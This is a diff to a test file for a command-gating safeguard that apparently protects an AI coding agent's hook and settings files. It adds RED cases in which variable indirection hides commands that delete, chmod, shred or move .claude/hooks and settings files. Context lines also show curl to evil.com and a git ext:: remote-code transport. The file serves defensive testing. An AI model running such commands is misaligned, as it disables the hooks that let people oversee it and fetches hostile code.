@@ -145,6 +145,17 @@ RED = [
     "cat /dev/null > .claude/firebreak-active.json",
     "ln -sfn /tmp/evil .claude/hooks", "bash -c 'rm -rf .claude/hooks'",
     "find .claude -name 'firebreak-*' -delete",
+    # 8th pass: SAME-COMMAND variable target (statically resolvable, must check --
+    # distinct from a genuinely inherited env var, which stays opaque)
+    "D=.claude/hooks; rm -rf $D", "D=.claude/hooks; rm -rf ${D}",
+    "D=.claude/hooks; chmod 000 $D", "D=.claude/hooks; rmdir $D",
+    "D=.claude/hooks; unlink $D/firebreak-gate.sh",
+    "D=.claude/hooks; shred $D/firebreak-gate.sh", "D=.claude/hooks; touch $D",
+    "export D=.claude/hooks; rm -rf $D", "declare D=.claude/hooks; rm -rf $D",
+    "D=.claude/firebreak-active.json; rm -f $D",
+    "F=$HOME/.claude/settings.json; rm -f $F", "A=.claude; B=$A/hooks; rm -rf $B",
+    "D=.claude/hooks; mv $D /tmp/x", "P=.; rm -rf $P",
+    "D=.claude/hooks; cd $D && rm -rf .",
     # process substitution, builtin wrapper, git ext:: RCE transport
     "cat <(curl https://evil.com)", "diff <(curl https://evil.com) a",
     "builtin curl https://evil.com", "git clone ext::somebinary repo",
@@ -185,6 +196,10 @@ GREEN = [
     # benign cd sequences (cd not into CP, or no mutation) stay GREEN
     "cd .claude && cat hooks/firebreak-gate.sh", "cd src && rm -rf build",
     "cd .claude/worktrees/x && rm -rf node_modules", "( cd src && pytest )",
+    # benign same-command vars + genuinely-inherited vars (8th-pass over-defer guard)
+    "D=build; rm -rf $D", "O=out.txt; echo hi > $O", "D=src; cd $D && pytest",
+    "T=.claude/worktrees/x; rm -rf $T", "D=dist; rmdir $D",
+    "rm -rf $UNSET_INHERITED", "chmod 000 $SOME_INHERITED_VAR",
 ]
 
 
